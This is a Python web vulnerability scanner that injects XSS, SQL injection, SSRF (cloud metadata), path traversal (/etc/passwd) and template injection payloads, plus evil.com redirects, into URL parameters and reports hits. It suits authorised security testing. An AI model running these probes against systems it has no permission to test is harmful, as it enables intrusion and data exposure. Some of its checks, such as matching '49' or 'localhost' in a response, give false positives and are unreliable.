import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36"
    )
}

# Params unlikely to cause real vuln — skip injecting into these
SKIP_PARAMS = {
    "utm_source", "utm_medium", "utm_campaign", "utm_content",
    "utm_term", "fbclid", "gclid", "lang", "locale", "theme",
    "_ga", "ref", "v", "ver", "cb"
}

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "'\"><svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
]

SQLI_PAYLOADS = [
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1\" --",
    "' OR 1=1 --",
    "1' ORDER BY 1--",
    "' UNION SELECT NULL--",
]

SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "syntax error", "unclosed quotation",
    "database error", "ora-01756", "pg_query", "sqlite_",
    "warning: mysql", "you have an error in your sql",
    "odbc driver", "microsoft ole db", "invalid query",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1/",
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost/",
    "http://[::1]/",
]

SSRF_SIGS = [
    "169.254.", "ami-id", "instance-id", "ec2", "metadata",
    "127.0.0.1", "localhost", "internal", "root:x"
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/passwd%00",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "../../../../windows/win.ini",
]

LFI_SIGS = [
    "root:x:0:0", "daemon:x:", "/bin/bash",
    "[boot loader]", "for 16-bit app support",
    "<?php", "warning: include"
]

SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "{{7*'7'}}",
]

SSTI_RESULTS = ["49", "7777777", "777777"]

# Redirect-related param names
REDIRECT_PARAMS = {"redirect", "url", "next", "return", "returnurl",
                   "goto", "continue", "destination", "forward",
                   "redir", "redirect_uri", "callback", "target"}

# URL/host params for SSRF
SSRF_PARAMS = {"url", "uri", "endpoint", "proxy", "host", "dest",
               "target", "site", "html", "source", "fetch",
               "request", "webhook", "path", "src"}

# File/path params for LFI
LFI_PARAMS = {"file", "path", "download", "include", "template",
              "page", "document", "folder", "root", "pg",
              "style", "pdf", "read", "load", "dir"}

# Template params for SSTI
SSTI_PARAMS = {"template", "render", "view", "layout",
               "theme", "format", "lang", "locale"}


# ===============================================
# SHARED HELPERS
# ===============================================

def _get(url, allow_redirects=False, timeout=8):
    """Safe GET. Returns (response, elapsed_seconds) or (None, 0)."""
    try:
        start = time.time()
        res = requests.get(
            url,
            headers=HEADERS,
            timeout=timeout,
            allow_redirects=allow_redirects,
            verify=False
        )
        return res, time.time() - start
    except requests.exceptions.Timeout:
        return None, 0
    except requests.exceptions.ConnectionError:
        return None, 0
    except Exception:
        return None, 0


def _inject_param(url, param, value):
    """
    Inject a value into a specific parameter in the URL query string.
    Returns the modified URL string.
    """
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))


def _inject_all_params(url, value, target_params=None):
    """
    Inject value into all query params (or only those in target_params).
    Yields (param_name, modified_url) pairs.
    """
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)

    for param in qs:
        if param in SKIP_PARAMS:
            continue
        if target_params and param.lower() not in target_params:
            continue
        yield param, _inject_param(url, param, value)


def _append_payload(url, payload, param="q"):
    """
    Append payload to URL: inject into existing params, or add a new one.
    Returns the test URL.
    """
    parsed = urlparse(url)
    if parsed.query:
        qs = parse_qs(parsed.query, keep_blank_values=True)
        for p in qs:
            if p not in SKIP_PARAMS:
                return _inject_param(url, p, payload)
    # No usable params — append a generic one
    sep = "&" if parsed.query else "?"
    return f"{url}{sep}{param}={quote(payload, safe='')}"


# ===============================================
# OPEN REDIRECT
# ===============================================

def validate_open_redirect(url):
    """
    Test for open redirect by injecting evil.com into redirect-related params.

    Returns:
        (confirmed: bool, test_url: str)
    """
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)

    # Prioritise redirect-specific params; fall back to all params
    candidates = {p for p in qs if p.lower() in REDIRECT_PARAMS}
    if not candidates:
        candidates = {p for p in qs if p not in SKIP_PARAMS}

    for param in candidates:
        test_url = _inject_param(url, param, "https://evil.com")
        res, _ = _get(test_url, allow_redirects=False)

        if res is None:
            continue

        location = res.headers.get("Location", "")
        if res.status_code in (301, 302) and "evil.com" in location:
            return True, test_url

    return False, url


# ===============================================
# XSS
# ===============================================

def validate_xss(url):
    """
    Test for reflected XSS using multiple payloads across all injectable params.

    Returns:
        (confirmed: bool, test_url: str)
    """
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)

    for payload in XSS_PAYLOADS:
        if qs:
            # Inject into each non-noise param
            for param in qs:
                if param in SKIP_PARAMS:
                    continue
                test_url = _inject_param(url, param, payload)
                res, _ = _get(test_url, allow_redirects=True)

                if res is None:
                    continue

                content_type = res.headers.get("Content-Type", "")
                if "text/html" in content_type and payload in res.text:
                    return True, test_url
        else:
            # No params — append to URL
            test_url = f"{url}{'&' if '?' in url else '?'}q={quote(payload, safe='')}"
            res, _ = _get(test_url, allow_redirects=True)

            if res and "text/html" in res.headers.get("Content-Type", "") and payload in res.text:
                return True, test_url

    return False, url


# ===============================================
# SQL INJECTION
# ===============================================

def validate_sqli(url):
    """
    Test for SQL injection using error-based and time-based detection.
    Uses baseline subtraction for time-based to avoid false positives on slow servers.

    Returns:
        (confirmed: bool, test_url: str)
    """
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)

    # Establish baseline response time on clean URL
    clean_url = urlunparse(parsed._replace(
        query=urlencode({p: ["1"] for p in qs}, doseq=True)
    )) if qs else url
    _, baseline = _get(clean_url)

    for payload in SQLI_PAYLOADS:
        if qs:
            for param in qs:
                if param in SKIP_PARAMS:
                    continue
                test_url = _inject_param(url, param, payload)
                res, elapsed = _get(test_url, timeout=12)

                if res is None:
                    continue

                # Error-based
                body = res.text.lower()
                if any(sig in body for sig in SQLI_ERRORS):
                    return True, test_url

                # Time-based (only if significantly slower than baseline)
                if elapsed - baseline > 4:
                    return True, test_url
        else:
            test_url = f"{url}{'&' if '?' in url else '?'}id={quote(payload, safe='')}"
            res, elapsed = _get(test_url, timeout=12)

            if res and any(sig in res.text.lower() for sig in SQLI_ERRORS):
                return True, test_url

            if elapsed - baseline > 4:
                return True, test_url

    return False, url


# ===============================================
# SSRF
# ===============================================

def validate_ssrf(url):
    """
    Test for SSRF by injecting internal/metadata URLs into host/url params.

    Returns:
        (confirmed: bool, test_url: str)
    """
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)

    candidates = {p for p in qs if p.lower() in SSRF_PARAMS}
    if not candidates:
        candidates = {p for p in qs if p not in SKIP_PARAMS}

    for payload in SSRF_PAYLOADS:
        for param in candidates:
            test_url = _inject_param(url, param, payload)
            res, _ = _get(test_url, allow_redirects=True)

            if res is None:
                continue

            body = res.text.lower()
            if any(sig in body for sig in SSRF_SIGS):
                return True, test_url

    return False, url


# ===============================================
# LFI / PATH TRAVERSAL
# ===============================================

def validate_lfi(url):
    """
    Test for local file inclusion by injecting traversal payloads into file/path params.

    Returns:
        (confirmed: bool, test_url: str)
    """
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)

    candidates = {p for p in qs if p.lower() in LFI_PARAMS}
    if not candidates:
        candidates = {p for p in qs if p not in SKIP_PARAMS}

    for payload in LFI_PAYLOADS:
        for param in candidates:
            test_url = _inject_param(url, param, payload)
            res, _ = _get(test_url, allow_redirects=True)

            if res is None:
                continue

            if any(sig in res.text for sig in LFI_SIGS):
                return True, test_url

    return False, url


# ===============================================
# SSTI
# ===============================================

def validate_ssti(url):
    """
    Test for server-side template injection using math expression payloads.
    Confirms by checking for evaluated result (e.g. {{7*7}} → 49).

    Returns:
        (confirmed: bool, test_url: str)
    """
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)

    candidates = {p for p in qs if p.lower() in SSTI_PARAMS}
    if not candidates:
        candidates = {p for p in qs if p not in SKIP_PARAMS}

    for payload in SSTI_PAYLOADS:
        for param in candidates if candidates else ["q"]:
            test_url = _inject_param(url, param, payload) if qs else \
                       f"{url}{'&' if '?' in url else '?'}{param}={quote(payload, safe='')}"

            res, _ = _get(test_url, allow_redirects=True)

            if res is None:
                continue

            if any(result in res.text for result in SSTI_RESULTS):
                return True, test_url

    return False, url


# ===============================================
# SELF-TEST
# ===============================================

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()

    tests = [
        ("Open Redirect", validate_open_redirect,
         "https://httpbin.org/redirect-to?url=https://example.com&next=home"),
        ("XSS",           validate_xss,
         "https://httpbin.org/get?q=hello&search=world"),
        ("SQLi",          validate_sqli,
         "https://httpbin.org/get?id=1&category=books"),
        ("SSRF",          validate_ssrf,
         "https://httpbin.org/get?url=https://example.com"),
        ("LFI",           validate_lfi,
         "https://httpbin.org/get?file=index.html&path=home"),
        ("SSTI",          validate_ssti,
         "https://httpbin.org/get?template=default&render=base"),
    ]

    print("[*] Running self-tests (against httpbin — expect no confirmations)\n")
    for name, fn, test_url in tests:
        confirmed, poc = fn(test_url)
        status = "CONFIRMED" if confirmed else "NOT CONFIRMED"
        print(f"  [{status}] {name} | {poc}")